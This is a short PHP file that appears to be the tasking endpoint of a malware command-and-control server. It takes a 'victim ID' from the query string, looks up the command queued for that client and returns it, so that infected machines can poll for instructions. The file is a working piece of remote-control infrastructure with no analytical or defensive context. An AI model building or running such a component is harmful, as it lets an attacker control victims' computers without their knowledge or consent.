<?php 
include 'classes/Database.php';
include 'classes/Clients.php';
if (isset($_GET['id'])) {
	$vicID = $_GET['id'];
	$client = new Clients;
	$command = $client->getCommand($vicID); 
	echo $command->command;
}
?>